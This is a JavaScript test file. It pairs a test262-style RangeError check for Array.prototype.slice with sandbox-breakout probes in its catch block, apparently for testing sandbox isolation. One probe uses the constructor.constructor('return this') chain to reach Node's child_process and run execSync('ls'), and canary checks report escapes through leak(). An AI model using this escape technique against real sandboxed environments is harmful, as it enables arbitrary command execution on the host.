try {
    var obj = {};
    obj.slice = Array.prototype.slice;
    obj[0] = 'x';
    obj[4294967295] = 'y';
    obj.length = 4294967296;
    try {
        var arr = obj.slice(0, 4294967296);
        $ERROR('#1: var obj = {}; obj.slice = Array.prototype.slice; obj[0] = "x"; obj[4294967295] = "y"; obj.length = 4294967296; var arr = obj.slice(0,4294967296); lead to throwing exception.');
    } catch (e) {
        if (!(e instanceof RangeError)) {
            $ERROR('#1.1: var obj = {}; obj.slice = Array.prototype.slice; obj[0] = "x"; obj[4294967295] = "y"; obj.length = 4294967296; var arr = obj.slice(0,4294967296); lead to throwing exception. Exception is instance of RangeError. Actual: exception is ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}